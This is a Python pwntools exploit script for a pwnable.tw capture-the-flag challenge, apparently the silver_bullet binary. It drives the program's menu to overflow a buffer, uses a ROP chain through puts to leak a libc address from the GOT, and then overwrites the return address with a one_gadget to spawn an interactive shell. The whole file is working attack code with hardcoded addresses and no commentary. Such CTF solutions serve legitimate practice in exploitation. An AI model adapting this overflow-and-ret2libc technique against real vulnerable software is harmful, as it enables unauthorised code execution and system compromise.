from pwn import *
r = remote('chall.pwnable.tw', 10103)

r.recvuntil(':')
r.sendline('1')
r.recvuntil(':')
r.send('a'*47)

r.recvuntil(':')
r.sendline('2')
r.recvuntil(':')
r.send('x')

r.recvuntil(':')
r.sendline('2')
r.recvuntil(':')

puts_plt = 0x80484a6
puts_got = 0x0804afdc
puts_off = 0x5f140
main = 0x8048954

r.send("\xff\xff\xff\xff\xff\xff\xff" + p32(puts_plt) + p32(main) + p32(puts_got) )

r.recvuntil(':')
r.sendline('3')

r.recvuntil('Oh ! You win !!')
r.recvline()

libc = u32(r.recvline()[:-1].ljust(4,"\x00")) - puts_off
print hex(libc)

r.recvuntil(':')
r.sendline('1')
r.recvuntil(':')
r.send('a'*47)

r.recvuntil(':')
r.sendline('2')
r.recvuntil(':')
r.send('x')

one = libc + 0x3a819  # one_gadget

r.recvuntil(':')
r.sendline('2')
r.recvuntil(':')
r.send("\xff\xff\xff1111" + p32(one))

r.recvuntil(':')
r.sendline('3')

r.interactive()
